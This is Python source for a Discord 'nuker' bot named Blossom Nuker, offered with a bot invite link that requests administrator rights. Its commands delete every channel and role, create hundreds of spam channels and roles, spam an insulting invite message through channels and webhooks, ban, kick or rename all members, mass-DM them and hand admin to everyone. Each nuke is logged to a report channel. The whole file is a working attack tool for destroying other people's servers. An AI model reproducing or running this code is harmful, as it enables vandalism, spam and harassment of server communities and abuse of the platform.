import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

# ============================================================
#  INTENTS
# ============================================================
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True

client = commands.Bot(command_prefix=";", intents=intents, help_command=None)

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT TRACKER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=15):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.1
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=15)

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;nuke - Maximum speed nuke")
    print(f"{Fore.MAGENTA}[2] ;help - Displays commands")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone")
    print(f"{Fore.MAGENTA}[4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows socials")
    print(f"{Fore.MAGENTA}[6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
    print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
    print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("nuke", "nothing"):
        await ctx.send("server whitelisted.")
        raise commands.CheckFailure()

# ============================================================
#  MAXIMUM SPEED NUKE COMMAND
# ============================================================
@client.command(name="nuke")
async def nuke(ctx):
    """Maximum speed nuke - deletes everything, creates 500 channels, 100 roles, spams."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("Need Administrator permissions.")
        return
    
    guild = ctx.guild
    await ctx.send("Nuking at maximum speed...")
    print(f"[NUKE] Starting on {guild.name} ({guild.id}) by {ctx.author}")

    # Phase 1: Delete all channels and roles in parallel
    delete_tasks = []
    delete_tasks.extend([c.delete() for c in guild.channels])
    delete_tasks.extend([r.delete() for r in guild.roles if r.name != "@everyone"])
    await asyncio.gather(*delete_tasks)
    print("[NUKE] Deleted all channels and roles")

    # Phase 2: Create 500 channels, 100 roles, change server name all at once
    create_tasks = []
    for i in range(500):
        create_tasks.append(guild.create_text_channel(f"rekt-{i}"))
    for i in range(100):
        create_tasks.append(guild.create_role(name=f"role-{i}"))
    create_tasks.append(guild.edit(name="nuked"))
    
    results = await asyncio.gather(*create_tasks)
    channels = [r for r in results if isinstance(r, discord.TextChannel)]
    print(f"[NUKE] Created {len(channels)} channels and 100 roles")

    # Phase 3: Spam all channels instantly
    if channels:
        spam_tasks = []
        for c in channels[:50]:
            spam_tasks.append(c.send(SPAM_MESSAGE))
        await asyncio.gather(*spam_tasks)
        print(f"[NUKE] Spammed {len(channels[:50])} channels")

    # Phase 4: Report to log channel
    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Nuke command used",
                description=f"Server nuked.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server", value=guild.name, inline=False)
            embed.add_field(name="Members", value=str(guild.member_count), inline=False)
            embed.add_field(name="ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            await report_channel.send(embed=embed)
    except:
        pass

    await ctx.send(f"Nuke complete. {len(channels)} channels created. Watch the carnage.")

# ============================================================
#  OTHER COMMANDS
# ============================================================
@client.command(name="hiroshima")
async def hiroshima(ctx):
    """Alias for ;nuke"""
    await nuke(ctx)

@client.command(name="spaminvite")
async def spaminvite(ctx, amount: int = 25):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming...")
    sent = 0
    for channel in channels:
        for _ in range(amount):
            try:
                await channel.send(SPAM_MESSAGE)
                sent += 1
                await asyncio.sleep(0.1)
            except:
                pass
    await ctx.send(f"Sent {sent} messages.")

@client.command(name="kicka")
async def kicka(ctx, member: discord.Member = None):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return

    if member is not None:
        if member == ctx.author:
            await ctx.send("You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author}")
            await ctx.send(f"Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
        return

    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the Kick Members permission.")
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author}")
            kicked += 1
        except Exception:
            failed += 1
    await ctx.send(f"Kicked {kicked} bot(s). {failed} failed.")

@client.command(name="blame")
async def blame(ctx, member: discord.Member = None):
    target = member or ctx.author
    reason = random.choice(["thanks for nuking", "caught in 4k", "its always them"])
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    await ctx.send(embed=embed)

@client.command(name="credits")
async def credits(ctx):
    await ctx.send("Bot created by 6syj on discord")
    await ctx.send("Get bot here: .gg/a6PrNZDP57")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command(name="getbot")
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command(name="whitelist")
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("Restricted to bot owner.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"Server `{guild_id}` whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"Server `{guild_id}` removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"Whitelisted: {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("No whitelisted servers.")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command(name="nothing")
async def nothing(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    
    await ctx.send("Deleting everything...")
    guild = ctx.guild
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass
    
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    await ctx.send("Everything deleted.")

@client.command(name="banall")
async def banall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send(f"Banning {len(ctx.guild.members)} members...")
    banned = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.ban(reason="Banall command")
            banned += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Banned {banned} members. {failed} failed.")

@client.command(name="dmall")
async def dmall(ctx, *, message: str = "You have been nuked."):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Dming {len(ctx.guild.members)} members...")
    sent = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(0.3)
        except:
            failed += 1
    await ctx.send(f"Dmed {sent} members. {failed} failed.")

@client.command(name="roles")
async def roles(ctx, count: int = 100):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 250:
        count = 250
    await ctx.send(f"Creating {count} roles...")
    created = 0
    failed = 0
    colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
    for i in range(count):
        try:
            color = random.choice(colors)
            await ctx.guild.create_role(name=f"role-{i}", color=color)
            created += 1
            if i % 10 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} roles. {failed} failed.")

@client.command(name="op")
async def op(ctx, member: discord.Member = None):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    target = member or ctx.author
    if target == ctx.guild.owner:
        await ctx.send("Cannot OP the server owner.")
        return
    try:
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if not admin_role:
            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
        await target.add_roles(admin_role)
        await ctx.send(f"{target.mention} now has Administrator.")
    except:
        await ctx.send("Failed to give OP. Missing permissions.")

@client.command(name="del")
async def del_channels(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all channels...")
    deleted = 0
    failed = 0
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} channels. {failed} failed.")

@client.command(name="rename")
async def rename_all(ctx, *, new_name: str = "nuked"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.manage_nicknames:
        await ctx.send("You need Manage Nicknames permission.")
        return
    await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...")
    renamed = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        try:
            await member.edit(nick=new_name)
            renamed += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Renamed {renamed} members. {failed} failed.")

@client.command(name="kickall")
async def kickall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need Kick Members permission.")
        return
    await ctx.send(f"Kicking {len(ctx.guild.members)} members...")
    kicked = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Kickall command")
            kicked += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Kicked {kicked} members. {failed} failed.")

@client.command(name="unbanall")
async def unbanall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send("Unbanning all banned members...")
    unbanned = 0
    failed = 0
    try:
        bans = [entry async for entry in ctx.guild.bans()]
        for ban_entry in bans:
            try:
                await ctx.guild.unban(ban_entry.user)
                unbanned += 1
                await asyncio.sleep(0.2)
            except:
                failed += 1
    except:
        await ctx.send("Failed to fetch ban list.")
        return
    await ctx.send(f"Unbanned {unbanned} members. {failed} failed.")

@client.command(name="droles")
async def droles(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all roles...")
    deleted = 0
    failed = 0
    for role in list(ctx.guild.roles):
        if role.name == "@everyone":
            continue
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} roles. {failed} failed.")

@client.command(name="adminall")
async def adminall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You need Administrator permission.")
        return
    await ctx.send("Giving admin to all members...")
    admin_role = discord.utils.get(ctx.guild.roles, name="AdminAll")
    if not admin_role:
        admin_role = await ctx.guild.create_role(name="AdminAll", permissions=discord.Permissions.all())
    added = 0
    failed = 0
    for member in list(ctx.guild.members):
        try:
            await member.add_roles(admin_role)
            added += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Gave admin to {added} members. {failed} failed.")

@client.command(name="wbspam")
async def wbspam(ctx, amount: int = 10):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Creating webhooks and spamming {amount} times each...")
    total_sent = 0
    failed = 0
    for channel in ctx.guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="spamhook")
            for _ in range(amount):
                try:
                    await webhook.send(SPAM_MESSAGE)
                    total_sent += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
            await webhook.delete()
        except:
            failed += 1
    await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.")

@client.command(name="spam")
async def spam(ctx, *, text: str = SPAM_MESSAGE):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    channels = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels.")
        return
    await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.")
    sent = 0
    for channel in channels:
        try:
            await channel.send(text)
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"Sent to {sent} channels.")

@client.command(name="spamchannels")
async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 200:
        count = 200
    await ctx.send(f"Creating {count} text channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} channels. {failed} failed.")

@client.command(name="spamvcs")
async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 100:
        count = 100
    await ctx.send(f"Creating {count} voice channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} voice channels. {failed} failed.")

@client.command(name="spamcats")
async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 50:
        count = 50
    await ctx.send(f"Creating {count} categories named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_category(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} categories. {failed} failed.")

# ============================================================
#  HELP COMMAND
# ============================================================
@client.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="Blossom Nuker Commands",
        description="Full command list:",
        color=discord.Color.magenta()
    )
    embed.add_field(
        name="Nuke",
        value=";nuke - Maximum speed nuke (500 channels, 100 roles, spam)\n"
              ";hiroshima - Alias for ;nuke",
        inline=False
    )
    embed.add_field(
        name="Destruction",
        value=";banall - Ban everyone\n"
              ";kickall - Kick everyone\n"
              ";unbanall - Unban everyone\n"
              ";del - Delete all channels\n"
              ";droles - Delete all roles\n"
              ";nothing - Delete everything (no spam)",
        inline=False
    )
    embed.add_field(
        name="Permissions",
        value=";op [@user] - Give admin to yourself or user\n"
              ";adminall - Give admin to everyone",
        inline=False
    )
    embed.add_field(
        name="Spam and Creation",
        value=";spam <text> - Spam custom text in all channels\n"
              ";spaminvite [amount] - Spam invite link\n"
              ";wbspam [amount] - Webhook spam\n"
              ";spamchannels <count> [name] - Create text channels\n"
              ";spamvcs <count> [name] - Create voice channels\n"
              ";spamcats <count> [name] - Create categories\n"
              ";roles [count] - Create roles",
        inline=False
    )
    embed.add_field(
        name="User Actions",
        value=";kicka [@user] - Kick user or all bots\n"
              ";rename <name> - Rename everyone\n"
              ";dmall <message> - DM all members\n"
              ";blame @user - Accuse someone",
        inline=False
    )
    embed.add_field(
        name="Utility",
        value=";getbot - Invite link\n"
              ";whitelist - Manage whitelist\n"
              ";credits - Bot credits",
        inline=False
    )
    embed.set_footer(text="Prefix: ;")
    await ctx.send(embed=embed)

# ============================================================
#  ERROR HANDLER
# ============================================================
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Command not found. Use `;help`.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(f"You don't have permission.")
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.send(f"I don't have permission. Missing: {error.missing_permissions}")
    else:
        print(f"[ERROR] {error}")
        await ctx.send(f"Error: {str(error)[:100]}")

# ============================================================
#  RUN
# ============================================================
if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
